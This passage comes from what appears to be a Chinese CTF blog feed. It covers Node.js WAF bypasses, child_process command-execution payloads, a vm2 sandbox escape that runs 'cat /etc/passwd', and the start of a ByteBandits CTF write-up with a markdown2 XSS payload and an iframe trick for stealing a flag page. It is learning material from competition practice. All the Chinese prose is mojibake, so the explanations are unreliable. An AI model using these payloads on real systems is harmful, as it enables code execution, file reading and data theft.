src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å½“ç„¶é’ˆå¯¹è™ç¬¦è¿™é“é¢˜è¿˜æœ‰æ•°ç»„ç»•è¿‡çš„ä¸€ä¸ªå§¿åŠ¿,å› ä¸ºåªæ˜¯æ¥å—å‚æ•°ï¼Œç„¶åè¿›è¡Œwafçš„è¾¨åˆ«,ä½¿ç”¨æ•°ç»„è‡ªç„¶ä¹Ÿæ˜¯å¯è¡Œçš„<br>æ„é€ payloadä¸Šç®€å•äº†è®¸å¤šã€‚å…¶å®åŸç†è·Ÿä¸Šé¢å¼±ç±»å‹çš„trickä¸€æ ·ï¼Œå½“æ•°ç»„åˆ†åˆ«ä¸º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"process"</span>] <span class="comment">//waf</span></span><br><span class="line">[<span class="string">"global.process"</span>]  <span class="comment">// ç»•è¿‡</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¢«wafæŒ¡ä½æ˜¾ç„¶æ˜¯å› ä¸ºæ•°ç»„çš„å€¼ç›´æ¥æå–å‡ºæ¥ä¸wafä¸­è¿‡æ»¤çš„æ¯ä¸€ä¸ªå…³é”®å­—æ¯”è¾ƒã€‚ä½†æ˜¯å¦‚æœæ˜¯å®Œæ•´çš„payloadå­—ç¬¦ä¸²æ˜¾ç„¶ä¸ä¼šè¢«ä»»ä½•å•ä¸ªçš„wafå…³é”®å­—åŒ¹é…åˆ°ã€‚</p><p>ä¸‹é¢è¿™ä¸ªpaypalçš„RCEä¾‹å­ä¹Ÿå¯ä»¥å‚è€ƒä¸‹<br><a href="https://artsploit.blogspot.com/2016/08/pprce2.html" target="_blank" rel="noopener">https://artsploit.blogspot.com/2016/08/pprce2.html</a> </p><p>å…³äºæ•°ç»„ç»•è¿‡è¿˜æœ‰ä¸€ä¸ªæœ‰è¶£çš„trickæ¥è‡ªHackTM2020 Draw with us<br><a href="https://xz.aliyun.com/t/7177#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/7177#toc-4</a><br>é‡Œé¢æœ‰ä¸€ä¸ªç‚¹,éœ€è¦è·å–nçš„å€¼ã€‚ä½†æ˜¯nåˆè¢«wafæŒ¡ä½äº†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkRights</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> blacklist = [<span class="string">"p"</span>, <span class="string">"n"</span>, <span class="string">"port"</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> element = arr[i];</span><br><span class="line">    <span class="keyword">if</span> (blacklist.includes(element)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒåŒæ ·å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚åœ¨jsä¸­,a[[â€œnâ€]]è¿˜æ˜¯è¢«ç†è§£æˆa.n æ‰€ä»¥wafåŒ¹é…ä¸åˆ°,ä½†æ˜¯è¿™æ ·ä»æ—§èƒ½è·å–nè¿™ä¸ªé”®çš„å€¼ã€‚</p><p><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥ä»¥ä¸Šå‡ ç§å†™æ³•åº”è¯¥å¯ä»¥è§£å†³å¤§å¤šæ•°wafäº†ã€‚</p><h2 id="å‘½ä»¤æ‰§è¡Œä¸æ²™ç›’é€ƒé€¸"><a href="#å‘½ä»¤æ‰§è¡Œä¸æ²™ç›’é€ƒé€¸" class="headerlink" title="å‘½ä»¤æ‰§è¡Œä¸æ²™ç›’é€ƒé€¸"></a>å‘½ä»¤æ‰§è¡Œä¸æ²™ç›’é€ƒé€¸</h2><p>jsé‡Œè°ƒç”¨å‡½æ•°æœ‰ä¸€ä¸ªè‡ªå·±ä¹‹å‰ä¸€ç›´ä¸å¤ªæ‡‚çš„ç‚¹ç»ˆäºå¼„æ˜ç™½äº†ã€‚</p><ul><li>IIFE</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;());</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;)();</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯IIFEï¼ˆç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼‰çš„å†™æ³•ã€‚javascriptåœ¨é‡åˆ°å®ƒä¹‹åå°†ç«‹å³æ‰§è¡Œå‡½æ•°ã€‚</p><p>åœ¨ååºåˆ—åŒ–æ¼æ´CVE-2017-5941 ä¸­æœ‰ä¸€å¤„evalçš„æ‹¼æ¥æ‰§è¡Œï¼Œå°±æ˜¯ç”¨åˆ°äº†è¿™ä¸ªã€‚å› ä¸ºevalåçš„è¯­å¥æ˜¯è¢«æ‹¬å·åŒ…è£¹äº†çš„ã€‚å…¶å®è¯´èµ·æ¥ä¹Ÿç®€å•ã€‚åŠ ä¸ªæ‹¬å·è€Œå·²ã€‚ç„¶åå‘½ä»¤åœ¨ååºåˆ—åŒ–æ—¶ç›´æ¥è§¦å‘ã€‚</p><p>ç„¶åå…³äºå‘½ä»¤æ‰§è¡Œçš„å‡ ä¸ªå¸¸è§payload,æ¯”å¦‚åŸå‹é“¾ä¸­å¸¸ç”¨çš„payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span><br><span class="line">global.process.mainModule.constructor._load(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span><br><span class="line">global.process.mainModule.require(<span class="string">'child_process'</span>).exec(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure><p>å¤§ä½“ä¸Šå°±è¿™å‡ ç§æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ã€‚å…¶å®ç®€å•è¯´å°±æ˜¯èƒ½è·å–åˆ°child_processè¿™ä¸€æ­¥å°±è¡Œäº†ã€‚å› ä¸ºNode.jsä¸­çš„chile_process.execè°ƒç”¨çš„æ˜¯/bash.shï¼Œå®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<br>è€Œç›´æ¥requireæœ‰æ—¶å€™æ˜¯è·å–ä¸åˆ°çš„,è¿™ç‚¹pç‰›ä¹Ÿè®²è¿‡äº†ã€‚</p><h3 id="æ²™ç›’é€ƒé€¸"><a href="#æ²™ç›’é€ƒé€¸" class="headerlink" title="æ²™ç›’é€ƒé€¸"></a>æ²™ç›’é€ƒé€¸</h3><p>å…¶å®æ²™ç›’é€ƒé€¸çš„é¢˜ä¹Ÿä¸æ—¶ç¬¬ä¸€æ¬¡åšã€‚ä¹‹å‰HITCONä¹Ÿæœ‰è¿‡è¿™æ ·çš„é¢˜,Confidenceä¸Šä¹Ÿæœ‰æ²™ç›’çš„é¢˜ã€‚ä½†æ˜¯è¿™æ¬¡æ¯”èµ›è¿˜æ˜¯æ‹‰èƒ¯äº†ã€‚è™½ç„¶æ˜¯ç¯å¢ƒçš„é—®é¢˜,ä½†è¦æ˜¯æ¥è§¦å¤šçš„è¯æ¢payloadæ‰“åº”è¯¥æ˜¯å¾ˆè½»æ¾çš„å§ã€‚æ‰€ä»¥è¿˜æ˜¯ç®€å•æ¥è§¦ä¸‹</p><p><a href="https://github.com/patriksimek/vm2/issues" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues</a><br>é¦–å…ˆè¦æ‰¾ç°æˆpayloadçš„è¯,ç›´æ¥ä¸Šgithubä¸Šissueæ‰¾å°±å¥½äº†,æœ‰ä½dalaoä¸“ä¸šç ”ç©¶æ²™ç›’é€ƒé€¸,åŸºæœ¬ä¸Šæ‰€æœ‰ç‰ˆæœ¬çš„payloadéƒ½æ˜¯ä»–æ‰¾çš„,ç›´æ¥issueé‡Œæœbreakoutå³å¯ã€‚</p><p>ç„¶åæ˜¯åŸç†ã€‚å…¶å®å°±æ˜¯ç›¸å½“äºç»™ä¸ªæ²™ç›’ç¯å¢ƒã€‚åƒprocessè¿™æ ·çš„å±é™©ä»£ç åŸºæœ¬éƒ½æ˜¯undefinedçš„ã€‚æ‰€ä»¥æ‰æœ‰äº†é€šè¿‡<code>this.constructor.constructor(&#39;return this.process.env&#39;)()</code><br>bypassçš„payloadå‡ºç°ã€‚(è·Ÿpythonsstiæ²™ç›’é€ƒé€¸å·®ä¸å¤šä¸æ˜¯å—)<br>vm2ç›¸æ¯”äºvmç¯å¢ƒé™åˆ¶æ›´åŠ ä¸¥æ ¼ã€‚åŸå…ˆé€šè¿‡thisè·å–constructorçš„æ–¹æ³•ä¸å†è¡Œå¾—é€šã€‚ç›®å‰ä¸»æµçš„æ–¹æ³•ä¸»è¦æ˜¯é€šè¿‡trycatchè¯­å¥æ„é€ ã€‚é€šè¿‡tryè¯­å¥ä¸­æŠ¥é”™è¿›å…¥åˆ°catchå—,å‡å¦‚catchå—æ•æ‰åˆ°çš„é”™è¯¯æ¯”å¦‚æ˜¯ç”±hostæ‰”å‡ºçš„,å°±èƒ½åˆ©ç”¨ä¸åŠ é™åˆ¶çš„hostä¸€æ­¥æ­¥è·å–å±æ€§åˆ°requireè¿›è€Œå‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.process.removeListener(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span> (host_exception) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'host exception: '</span> + host_exception.toString());</span><br><span class="line">        host_constructor = host_exception.constructor.constructor;</span><br><span class="line">        host_process = host_constructor(<span class="string">'return this'</span>)().process;</span><br><span class="line">  child_process = host_process.mainModule.require(<span class="string">"child_process"</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(child_process.execSync(<span class="string">"cat /etc/passwd"</span>).toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è™ç¬¦è¿™é¢˜åˆ™åŸºæœ¬å°±æ˜¯æŒ‰hackimçš„babyjsæ”¹çš„ã€‚å‰ç«¯éƒ½å‡ ä¹ä¸€æ ·ã€‚åªä¸è¿‡vmç‰ˆæœ¬æ¢æˆäº†3.8.3â€¦æ‰€ä»¥æœä¸‹issueå°±è¡Œäº†ã€‚bypassç”¨ä¸Šé¢æ€»ç»“çš„æ–¹æ³•éƒ½å¯ä»¥ã€‚</p><p>å…³äºæ²™ç›’é€ƒé€¸çš„ä¸€äº›ç»†èŠ‚æˆ‘ä¹Ÿæ˜¯ä¸å¤ªæ‡‚ã€‚æ‰“ç®—è¿‡æ®µæ—¶é—´æŠŠå›½é™…èµ›ä¸Šjsæ²™ç›’é€ƒé€¸çš„é¢˜è¡¥ä¸€ä¸‹ã€‚ç›®å‰çš„å¥—è·¯ç®€å•æœ‰ï¼š<br><code>Error().stack</code><br>ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥çˆ†å‡ºstack strace.ç›¸å½“äºæ˜¯ä¸€ä¸ªFUZZæ‰‹æ®µäº†.çˆ†å‡ºé”™è¯¯ä¿¡æ¯å¦‚vm.jsæˆ–è€…vm2.jså°±å¯ä»¥å»æ”¶é›†å¯¹åº”çš„payloadäº†ã€‚</p><p>æ—¥åå†ç¢°åˆ°æ²™ç›’é€ƒé€¸çš„é¢˜ä¹Ÿä¼šæ”¾åˆ°æ–‡ç« é‡Œæ€»ç»“ã€‚å¸Œæœ›è‡ªå·±èƒ½å°½å¿«ä¸Šæ‰‹Node.jså§ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://xz.aliyun.com/t/7184" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184</a><br><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ByteBanditsCTF2020ä¸¤é“WEBå¤ç°</title>
      <link href="2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>è¿™å‘¨æœ«åˆå½“äº†æ³¢å›½é™…èµ›åˆ’æ°´æ‡’ç‹—ã€‚çœ‹äº†å‡ ä¸ªæ¯”èµ›éš¾åº¦å‚å·®ä¸é½ã€‚åªæœ‰bytebanditsçš„éš¾åº¦ç¡®å®é¡¶ã€‚å½“æ—¶çœ‹äº†ä¸‹NotesAppæ²¡åšå‡ºæ¥å°±åˆ’æ°´å»äº†ã€‚æ‰€å¹¸å®˜æ–¹å¾ˆè´´å¿ƒçš„ç»™äº†dockerçš„ç¯å¢ƒã€‚ç°åœ¨æŠŠä¸¤é“WEBå¤ç°ä¸‹,éƒ½æ˜¯å¾ˆæœ‰ä»·å€¼çš„é¢˜ç›®ã€‚</p><a id="more"></a><h2 id="NotesAPP"><a href="#NotesAPP" class="headerlink" title="NotesAPP"></a>NotesAPP</h2><p>è¿™é¢˜å¤ç°çš„è¯æœ‰ä¸€ä¸ªé—®é¢˜,å°±æ˜¯è¦æ”¹ä¸‹æºç ã€‚ä¸€ä¸ªæ˜¯æ”¹botçš„è®¿é—®åœ°å€ã€‚å†ä¸€ä¸ªå°±æ˜¯å› ä¸ºé‡Œé¢ç”¨äº†Googlecaptchakey,æ‰€ä»¥å¾—æ¢ã€‚ä½†æ˜¯æˆ‘ç»™è‡ªå·±çš„vpsç”³è¯·çš„keyæ¢äº†åè¿˜æ˜¯ä¸é¡¶ç”¨ã€‚ç´¢æ€§æŠŠç›¸å…³çš„htmlè·Ÿpythonä»£ç åˆ æ‰äº†,å§‘ä¸”æ˜¯èƒ½åšäº†hhh.</p><p>é¦–å…ˆé¢˜ç›®ç»™äº†æºç ã€‚ç°åœ¨å¯ä»¥åˆ°å®˜æ–¹githubä¸Šçœ‹<a href="https://github.com/ByteBandits/bbctf-2020/tree/master/web/notes" target="_blank" rel="noopener">https://github.com/ByteBandits/bbctf-2020/tree/master/web/notes</a></p><p>ç®€å•å®¡è®¡åé¦–å…ˆæ³¨æ„åˆ°ä¸€ä¸ªmarkdown xss</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/profile")</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"profile.html"</span>, current_user = current_user)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/update_notes", methods=["POST"])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_notes</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> current_user.id == <span class="string">'admin'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Nope."</span></span><br><span class="line">    <span class="comment"># markdown support!!</span></span><br><span class="line">    current_user.notes = markdown2.markdown(request.form.get(<span class="string">'notes'</span>), safe_mode = <span class="literal">True</span>)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">"/profile"</span>)</span><br></pre></td></tr></table></figure><p>ç™»å½•è¿›å»ååœ¨/profileè·¯ç”±å³å¯updatemarkdownå†…å®¹ã€‚è¿™é‡Œè‡ªç„¶æƒ³åˆ°markdownxssã€‚ä¸è¿‡å½“æ—¶å°è¯•äº†ä¸‹å¹¶æ²¡æœ‰æ‰“å‡ºæ¥ã€‚<br>å› ä¸ºè¿™é‡Œç”¨åˆ°çš„æ˜¯markdown2è¿™ä¸ªåº“çš„safe_modeã€‚htmlæ ‡ç­¾éƒ½ä¼šç›´æ¥è½¬ä¹‰ã€‚<br>åæ¥å‘ç°ç”¨åˆ°çš„æ˜¯githubä¸Šçš„ä¸€ä¸ªissue.<br><a href="https://github.com/trentm/python-markdown2/issues/341" target="_blank" rel="noopener">https://github.com/trentm/python-markdown2/issues/341</a><br>safe_modeæˆ–è€…escapeéƒ½æœ‰å¯¹åº”çš„xsspayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;q?&lt;!-&lt;[&lt;script&gt;alert(1);&#x2F;\*](http:&#x2F;&#x2F;g)-&gt;a&gt;&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;g.c?&lt;!-&lt;[a\\*&#x2F;&lt;&#x2F;script&gt;alert(1);&#x2F;*](http:&#x2F;&#x2F;g)-&gt;a&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¾—åˆ°ä¸€ä¸ªself-xss.</p><p>å¾—åˆ°self-xssçš„ç¬¬ä¸€æ­¥å°±æ˜¯åº”è¯¥è€ƒè™‘å¦‚ä½•æå‡xssçš„å±å®³æ€§ã€‚å› ä¸ºæˆ‘ä»¬çš„é¢˜ç›®è¿˜æœ‰ä¸€å¤„<code>/send_link</code>è·¯ç”±æ˜æ˜¾æ˜¯æäº¤urlåè®©botè¿›è¡Œè®¿é—®ã€‚é‚£ä¹ˆè¿™é‡Œå¯èƒ½éœ€è¦è€ƒè™‘csrfã€‚<br>å› ä¸ºåªæœ‰adminç™»å½•è®¿é—®profileä¼šå¾—åˆ°flagã€‚æˆ‘ä»¬è®¿é—®è‡ªå·±çš„profileåªèƒ½å¾—åˆ°è‡ªå·±çš„å†…å®¹ã€‚<br>ä¼ ç»Ÿçš„CSRFä¸€å®šæ˜¯éµå¾ªä»¥ä¸‹åŸåˆ™çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.ç™»å½•å—ä¿¡ä»»ç½‘ç«™Aï¼Œå¹¶åœ¨æœ¬åœ°ç”ŸæˆCookieã€‚</span><br><span class="line">2.åœ¨ä¸ç™»å‡ºAçš„æƒ…å†µä¸‹ï¼Œè®¿é—®å±é™©ç½‘ç«™Bã€‚</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåŸºäºæ­¤é¢˜botçš„å­˜åœ¨,æˆ‘ä»¬å¤§æ¦‚çš„æµç¨‹æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.è®©botè®¿é—®profile,æ­¤æ—¶å­˜åœ¨flag</span><br><span class="line">2.logout</span><br><span class="line">3.ç™»å½•æ„é€ å¥½payloadçš„ç”¨æˆ·ï¼Œå¹¶åŠ è½½payload.å¾—åˆ°adminçš„ä¿¡æ¯</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å­˜åœ¨å‡ ä¸ªç»†èŠ‚ï¼š<br>å¦‚ä½•æ§åˆ¶botç™»å‡ºå¹¶ç™»å½•ï¼Ÿ<br>å¦‚ä½•è®©æˆ‘ä»¬çš„payloadèƒ½å¤Ÿå¾—åˆ°adminé¡µé¢çš„ä¿¡æ¯ï¼Ÿ</p><p>ä»”ç»†è§‚å¯Ÿå‘ç°ä¸€ä¸ªç»†èŠ‚ã€‚å½“æˆ‘ä»¬æ³¨å†Œæ—¶,ç”¨æˆ·åä¸å¯†ç é€šè¿‡postæ–¹å¼è¯·æ±‚ã€‚ä½†æ˜¯å½“æˆ‘ä»¬ç™»å‡ºå†ç™»å½•æ—¶ï¼Œå´æ˜¯é€šè¿‡getè¯·æ±‚è¿›è¡Œç™»å½•ã€‚<br>å› æ­¤å…ˆç™»å‡ºå†ç™»å½•çš„ç»†èŠ‚å°±è§£å†³äº†ã€‚<br>è‡³äºåŠ è½½adminçš„ä¿¡æ¯ï¼Œä½¿ç”¨åˆ°çš„è‡ªç„¶æ˜¯ç»å…¸çš„iframe xss ã€‚åŸæ¥æ€»ç»“CSPæ—¶ç”¨è¿‡ã€‚ç»å…¸çš„åˆ©ç”¨å°±æ˜¯ï¼š<br>ä¸€ä¸ªåŒæºé¡µé¢ï¼Œä¸€ä¸ªæ˜¯CSPä¿æŠ¤çš„flagé¡µé¢Aï¼Œä¸€ä¸ªæ˜¯å­˜åœ¨xssçš„é¡µé¢Bã€‚åªéœ€è¦ä¸€ä¸ªiframeå°±èƒ½çªƒå–åˆ°flag.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">iframe.src=<span class="string">"Aé¡µé¢"</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">'flag'</span>).innerHTML),<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><p>æ­¤é¢˜å¹¶æ²¡æœ‰å¯¹iframeçš„é™åˆ¶ã€‚è‡ªç„¶æ˜¯å¯è¡Œçš„</p><p>æ‰€ä»¥æ„æ€åæˆ‘ä»¬çš„payloadåº”è¯¥æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.æäº¤url,è®©botè®¿é—®æˆ‘ä»¬vpsä¸Šçš„å†…å®¹</span><br><span class="line">2.å…ˆåŠ è½½ä¸€ä¸ªiframeå»è®¿é—®profileå¹¶ç™»å‡º</span><br><span class="line">3.å†åŠ è½½ä¸€ä¸ªiframeï¼Œé€šè¿‡urlç›´æ¥ç™»å½•æˆ‘ä»¬è‡ªå»ºè´¦å·ã€‚è§¦å‘payload</span><br></pre></td></tr></table></figure><p>ç„¶è€Œè¿™é¢˜æœ‰ä¸ªå‘ æ³¨æ„åˆ°visit_link.pyä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> pyppeteer <span class="keyword">import</span> launch</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> Redis</span><br><span class="line"><span class="keyword">from</span> rq <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> psutil, signal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(url)</span>:</span></span><br><span class="line">    browser = <span class="keyword">await</span> launch(headless=<span class="literal">True</span>,</span><br><span class="line">                           executablePath=<span class="string">"/usr/bin/chromium-browser"</span>,</span><br><span class="line">                           args=[<span class="string">'--no-sandbox'</span>, <span class="string">'--disable-gpu'</span>])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">        <span class="keyword">await</span> page.goto(<span class="string">"https://notes.web.byteband.it/login"</span>)</span><br><span class="line">        <span class="keyword">await</span> page.type(<span class="string">"input[name='username']"</span>, <span class="string">"admin"</span>)</span><br><span class="line">        <span class="keyword">await</span> page.type(<span class="string">"input[name='password']"</span>, os.environ.get(<span class="string">"ADMIN_PASS"</span>))</span><br><span class="line">        <span class="keyword">await</span> asyncio.wait([</span><br><span class="line">            page.click(<span class="string">'button'</span>),</span><br><span class="line">            page.waitForNavigation(),</span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">        newPage = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">        <span class="keyword">await</span> newPage.goto(url)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">await</span> browser.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    asyncio.get_event_loop().run_until_complete(main(url))</span><br><span class="line"></span><br><span class="line">q = Queue(connection=Redis(host=<span class="string">'redis'</span>))</span><br></pre></td></tr></table></figure><p>è¿™ä¸²å¼‚æ­¥ä»£ç è®©adminåªè¦è®¿é—®äº†åç«‹å³é€€å‡ºã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„payloadå¹¶ä¸ä¼šæœ‰æ—¶é—´è§¦å‘ã€‚</p><p>å› 